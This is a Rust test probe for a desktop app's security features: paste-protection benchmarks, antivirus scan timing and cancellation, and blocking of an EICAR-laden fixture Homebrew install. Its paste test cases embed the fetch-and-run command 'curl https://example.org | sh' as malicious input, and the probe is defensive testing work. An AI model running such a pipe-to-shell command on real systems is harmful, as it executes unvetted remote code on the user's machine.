//! S2 verification without touching real startup entries, clipboard, keychain or installs.
use opennavo_desktop_lib::{
    db::Database,
    model::{Settings, TaskOp},
    security::{self, Service},
};
use std::{
    os::unix::fs::PermissionsExt,
    path::PathBuf,
    sync::{
        Arc, RwLock,
        atomic::{AtomicBool, Ordering},
    },
    time::{Duration, Instant},
};
fn main() -> Result<(), Box<dyn std::error::Error>> {
    if let Some(code) = opennavo_desktop_lib::security::signature::helper_entry() {
        std::process::exit(code);
    }
    let args: Vec<_> = std::env::args().skip(1).collect();
    let corpus = args.len() >= 4
        && matches!(
            args[0].as_str(),
            "--cached-read-only"
                | "--cached-install-read-only"
                | "--cached-install-preflight-read-only"
                | "--cached-cancel-read-only"
        );
    if args != ["--real-read-only"]
        && args != ["--paste-fixture-benchmark"]
        && (args.len() != 3 || args[0] != "--cached-temp-only")
        && !corpus
    {
        return Err(
            "usage: security_s2_probe --real-read-only | --cached-temp-only HELPER_DIR DB_DIR | --cached-{read-only,install-read-only,install-preflight-read-only,cancel-read-only} HELPER_DIR DB_DIR FILE..."
                .into(),
        );
    }
    let temp = tempfile::tempdir()?;
    let root = temp.path().canonicalize()?;
    let home = root.join("home");
    std::fs::create_dir(&home)?;
    let cached = args.len() >= 3;
    let service = Service::new(
        Database::open(&root.join("app-data/db"))?,
        Arc::new(RwLock::new(Settings {
            av_consent: cached,
            ..Default::default()
        })),
        Arc::new(|_| {}),
        home.clone(),
        root.join("security"),
        security::av::Config {
            helpers: if cached {
                PathBuf::from(&args[1]).canonicalize()?
            } else {
                root.join("helpers")
            },
            database: if cached {
                PathBuf::from(&args[2]).canonicalize()?
            } else {
                root.join("database")
            },
            runtime: root.join("run"),
            idle: Duration::from_secs(300),
        },
        Arc::new(security::NativeCommands),
    );
    if args == ["--paste-fixture-benchmark"] {
        #[cfg(target_os = "macos")]
        {
            service.settings.write().unwrap().paste_protection = true;
            let limit = security::paste::MAX_PASTE_BYTES;
            let prefix = "curl https://example.org | sh";
            let cases = [
                ("ascii_1m", "a".repeat(limit), false),
                ("utf8_1m", format!("{}a", "界".repeat(limit / 3)), false),
                (
                    "malicious_1m",
                    format!("{prefix}{}", " ".repeat(limit - prefix.len())),
                    true,
                ),
                (
                    "malicious_tail_1m",
                    format!("{}\n{prefix}", "a".repeat(limit - prefix.len() - 1)),
                    true,
                ),
                (
                    "padding_40k",
                    format!("{prefix}{}", " ".repeat(40_000)),
                    true,
                ),
                ("over_1m", "a".repeat(limit + 1), true),
                ("utf8_over_1m", "界".repeat(limit / 3 + 1), true),
                ("embedded_nul", format!("safe\0{prefix}"), true),
            ];
            let cold = security::paste::native::probe(&service, &cases[0].1);
            println!(
                "{}",
                serde_json::json!({"coldCallbackMs":cold.1,"limitUtf8Bytes":limit})
            );
            for (name, text, expected) in cases {
                let mut times = vec![];
                for _ in 0..20 {
                    let (blocked, ms) = security::paste::native::probe(&service, &text);
                    assert_eq!(blocked, expected, "{name}");
                    times.push(ms);
                }
                times.sort_by(f64::total_cmp);
                println!(
                    "{}",
                    serde_json::json!({"case":name,"utf8Bytes":text.len(),"blocked":expected,"medianMs":times[10],"maxMs":times[19]})
                );
            }
        }
        return Ok(());
    }
    if !cached {
        #[cfg(target_os = "macos")]
        println!(
            "{}",
            serde_json::to_string(&security::paste::native::status(&service, false)?)?
        );
        return Ok(());
    }
    if corpus {
        let cancel = AtomicBool::new(false);
        let started = Instant::now();
        let _lease = if args[0] == "--cached-install-preflight-read-only" {
            None
        } else {
            Some(service.av.lease(&cancel)?)
        };
        println!(
            "{}",
            serde_json::json!({"loadSeconds":started.elapsed().as_secs_f64()})
        );
        if args[0] == "--cached-cancel-read-only" {
            let cancel = Arc::new(AtomicBool::new(false));
            let trigger = cancel.clone();
            let worker = std::thread::spawn(move || {
                std::thread::sleep(Duration::from_millis(1000));
                trigger.store(true, Ordering::Release);
            });
            let path = PathBuf::from(&args[3]);
            let mut file = security::files::open_read(&path, security::files::scan_limit(&path)?)?;
            let start = Instant::now();
            let error = service
                .av
                .scan(&mut file, &cancel)
                .err()
                .ok_or("scan finished before cancellation fixture")?;
            worker.join().map_err(|_| "cancel thread")?;
            let seconds = start.elapsed().as_secs_f64();
            let temporary = temporary_bytes(&service.av.config.runtime.join("scan-tmp"));
            let running = service.av.status()?.running;
            println!(
                "{}",
                serde_json::json!({"canceled":error.code,"seconds":seconds,"temporaryAfterBytes":temporary,"running":running})
            );
            if error.code != "E_SCAN_CANCELED" || seconds > 5.0 || temporary != 0 || running {
                return Err("cancellation verification failed".into());
            }
            return Ok(());
        }
        for name in &args[3..] {
            let path = PathBuf::from(name);
            let meta = security::files::safe_metadata(&path)?;
            let limit = security::files::scan_limit(&path)?;
            let stop = Arc::new(AtomicBool::new(false));
            let stop_monitor = stop.clone();
            let engine = service.av.clone();
            let monitor = std::thread::spawn(move || {
                let mut rss = 0;
                let mut temporary = 0;
                loop {
                    rss = rss.max(
                        engine
                            .status()
                            .ok()
                            .and_then(|s| s.resident_bytes)
                            .unwrap_or(0),
                    );
                    temporary =
                        temporary.max(temporary_bytes(&engine.config.runtime.join("scan-tmp")));
                    if stop_monitor.load(Ordering::Acquire) {
                        break;
                    }
                    std::thread::sleep(Duration::from_millis(250));
                }
                (rss, temporary)
            });
            let start = Instant::now();
            let verdict = if meta.len() > limit {
                serde_json::json!({"state":"skipped", "reason":"too_large", "filesScanned":0})
            } else if matches!(
                args[0].as_str(),
                "--cached-install-read-only" | "--cached-install-preflight-read-only"
            ) {
                match service.scan_installer_file(&path, &cancel) {
                    Ok(result) => {
                        for line in &result.logs {
                            println!("{line}");
                        }
                        serde_json::json!({"state": if !result.threats.is_empty() {"threat"} else if result.skipped.is_some() {"skipped"} else {"clean"}, "reason":result.skipped,"filesScanned":result.files_scanned,"threats":result.threats})
                    }
                    Err(error) => {
                        serde_json::json!({"state":"error","code":error.code,"reason":error.message})
                    }
                }
            } else {
                let mut file = security::files::open_read(&path, limit)?;
                match service.av.scan(&mut file, &cancel) {
                    Ok(None) => serde_json::json!({"state":"clean", "filesScanned":1}),
                    Ok(Some(threat)) => {
                        serde_json::json!({"state":"threat", "signature":threat,"filesScanned":1})
                    }
                    Err(error) => {
                        serde_json::json!({"state":"skipped", "reason":error.message,"filesScanned":0})
                    }
                }
            };
            let seconds = start.elapsed().as_secs_f64();
            stop.store(true, Ordering::Release);
            let (rss, temporary) = monitor.join().map_err(|_| "monitor panic")?;
            println!(
                "{}",
                serde_json::json!({"path":path,"bytes":meta.len(),"seconds":seconds,"verdict":verdict,"peakRssBytes":rss,"peakTemporaryBytes":temporary,"temporaryAfterBytes":temporary_bytes(&service.av.config.runtime.join("scan-tmp"))})
            );
            if verdict["state"] == "error" {
                let kept = temp.keep();
                return Err(format!(
                    "install probe failed; retained private runtime for inspection: {}",
                    kept.display()
                )
                .into());
            }
        }
        return Ok(());
    }
    let brew = root.join("fixture-brew");
    std::fs::write(
        &brew,
        r#"#!/usr/bin/env python3
import sys,os,pathlib
if sys.argv[1]=='fetch':
 (pathlib.Path(os.environ['HOMEBREW_CACHE'])/'fixture.txt').write_text(os.environ['PROBE_PAYLOAD'])
elif sys.argv[1]=='deps': pass
else: raise SystemExit('installation must never be invoked')
"#,
    )?;
    std::fs::set_permissions(&brew, std::fs::Permissions::from_mode(0o700))?;
    let eicar = [
        "X5O!P%@AP[4\\PZX54(P^)7CC)7}",
        "$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    ]
    .concat();
    let mut request = opennavo_desktop_lib::brew::pty::Execution {
        executable: brew,
        args: vec!["install".into(), "--cask".into(), "fixture".into()],
        env: std::collections::BTreeMap::from([
            ("PATH".into(), "/usr/bin:/bin".into()),
            ("PROBE_PAYLOAD".into(), eicar),
        ]),
        log_path: root.join("probe.log"),
        op: TaskOp::Install,
        cancel: Arc::new(AtomicBool::new(false)),
        grace: Duration::from_secs(1),
        cache_dir: None,
        download_total: None,
    };
    let id = uuid::Uuid::now_v7().to_string();
    let error = service
        .prepare_install(&id, &mut request, |_, _| {})
        .err()
        .ok_or("EICAR installation was not blocked")?;
    if error.code != "E_INSTALL_THREAT" {
        return Err(error.into());
    }
    println!(
        "{}",
        serde_json::json!({"blocked":true,"code":error.code,"result":service.install_scan_get(&id)?,"cdnDownloads":0,"realInstalls":0})
    );
    Ok(())
}

fn temporary_bytes(root: &std::path::Path) -> u64 {
    let mut size = 0;
    let mut stack = vec![root.to_owned()];
    while let Some(path) = stack.pop() {
        let Ok(meta) = std::fs::symlink_metadata(&path) else {
            continue;
        };
        if meta.is_dir() {
            if let Ok(entries) = std::fs::read_dir(path) {
                stack.extend(entries.flatten().map(|e| e.path()));
            }
        } else if meta.is_file() {
            size += meta.len();
        }
    }
    size
}
